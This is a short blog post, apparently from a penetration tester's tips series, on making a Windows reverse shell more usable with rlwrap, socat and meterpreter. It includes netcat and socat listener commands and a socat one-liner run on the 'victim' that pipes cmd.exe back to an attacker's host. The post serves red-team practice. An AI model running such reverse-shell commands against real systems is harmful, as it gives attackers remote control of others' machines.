---
description: >-
  How to upgrade a Windows reverse shell to a fully usable TTY-type shell
title: Upgrade a Windows reverse shell to a fully usable shell                    # Add title of the machine here
date: 2021-05-01 08:00:00 -0600                           # Change the date to match completion date
categories: [Tips & Tricks]                     # Categories
tags: [hacking, redteam, tips-n-tricks, windows, socat, meterpreter]     # TAG names should always be lowercase; add relevant tags
show_image_post: true                                    # Change this to true
#image: /assets/img/                # Add image here for post preview image
---

![Hack responsibly disclaimer](/assets/markups/1-hack-responsibly.svg)

## Upgrading remote shells (Windows machines)

In a [previous article](https://zweilosec.github.io/posts/upgrade-linux-shell/) I wrote about upgrading limited Linux shells to a fully usable TTY shell.  Usually, after catching a reverse shell from a Windows machine through netcat you already have a shell that has full functionality. However, on occasion your shell is limited in some ways that can be truly annoying.  The features I miss the most are command history (and using the 'up' and 'down' arrows to cycle through them) and tab autocompletion.  It can feel quite disorienting working in a shell that is missing these vital features.
 
Options for upgrading Windows reverse shells are more limited than they are coming from a Linux machine.  

## rlwrap

You can mitigate some of the restrictions of poor netcat shells by wrapping the netcat listener with the `rlwrap` command.  This is not installed in Kali Linux by default so you will need to install it using the command `sudo apt install rlwrap -y`.  Other distributions may or may not have this installed or available in their package manager.

```bash
rlwrap nc -lvnp $port
```

Start your netcat listener by first prefixing it with the `rlwrap` command, then specifying the port to listen on.  Your shell will automatically be a bit more stable than running netcat by itself.

## socat 

Another powerful tool that can be used to get functional shells, do port forwarding, and much more is [`socat`](http://www.dest-unreach.org/socat/).  (Windows version: [https://github.com/3ndG4me/socat](https://github.com/3ndG4me/socat))

1. From your attack platform create a listener

```bash
socat TCP4-LISTEN:$port,fork STDOUT
```

2. Upload to or compile `socat.exe` on the Windows victim machine.

3. On the Windows victim create the reverse shell back to your waiting listener.

```bash
socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes
```

## meterpreter

Another method of upgrading the functionality of a Windows reverse shell that I know is to create a reverse shell payload that calls a `meterpreter` interactive shell.  This shell interacts with the Metasploit Framework to provide additional functionality such as uploading and downloading files, attempting to elevate privileges to System, and more.

## Other Examples

If you have any other examples of methods of upgrading Windows reverse shells, or have any other fun or useful tips or tricks, feel free to contact me on Github at [https://github.com/zweilosec](https://github.com/zweilosec) or in the comments below!

If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=zweilosec&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff"></a>